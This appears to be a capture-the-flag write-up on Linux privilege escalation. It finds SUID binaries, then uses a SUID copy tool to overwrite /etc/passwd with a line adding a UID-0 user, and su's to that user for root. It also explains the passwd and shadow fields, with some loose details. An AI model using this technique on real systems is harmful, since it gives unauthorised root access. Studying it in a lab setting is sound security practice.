## linux escalation
from `strings passwd in /usr/bin`
/etc/passwd
/etc/shadow
/usr/lib/debug/.dwz/x86_64-linux-gnu/passwd.debug

`grep -r -i "password" *`
pam.d looks interesting

elf@1db3e7354052:/bin$ find / -perm -4000 2>/dev/null
`/usr/bin/simplecopy` it has rwxs the `s` permission allows running for the root user

// simplecopy maybe allows copying of other files 
`./simplecopy `                   
Usage: ./simplecopy <source> <destination>


```
elf@9f255a4f6bc8:/tmp/myTmp$ echo 'hello:$1$hello$OYK6k6djmHg1dIhMlFMPA/:0:0:root:/root:/bin/bash' > passwd
elf@9f255a4f6bc8:/tmp/myTmp$ /usr/bin/simplecopy passwd /etc/passwd
elf@9f255a4f6bc8:/tmp/myTmp$ su hello
```

### Explained hello:$1$hello$OYK6k6djmHg1dIhMlFMPA/:0:0:root:/root:/bin/bash
`hello:x:0:0:root:/root:/bin/bash`
Username (hello): The name of the user.
Password (x): An x indicates that the password is stored in the /etc/shadow file.
UID (0): The User ID number. 0 is the UID for the root user, which gives full administrative privileges.
GID (0): The Group ID number. 0 is the GID for the root group.
GECOS (root): The GECOS field typically contains the full name of the user, but can also include other information like the user’s office location or phone number.
Home Directory (/root): The absolute path to the user's home directory. For the root user, this is typically /root.
Shell (/bin/bash): The absolute path to the user's default shell. /bin/bash is the Bash shell.

### Explanation of /etc/shadow Fields:
`hello:$1$hello$OYK6k6djmHg1dIhMlFMPA/:0:0:99999:7:::`
hello: Username.
$1$hello$OYK6k6djmHg1dIhMlFMPA/: Password hash.
0: Last password change (0 means user must change password at next login).
0: Minimum number of days between password changes.
99999: Maximum number of days the password is valid.
7: Number of days to warn user before password expiration.
Empty: Number of days after password expiration until account is disabled.
Empty: Account expiration date.
Empty: Reserved for future use.


## Finally
su to your new user
Go to the /root and run the file. and answer is `santa`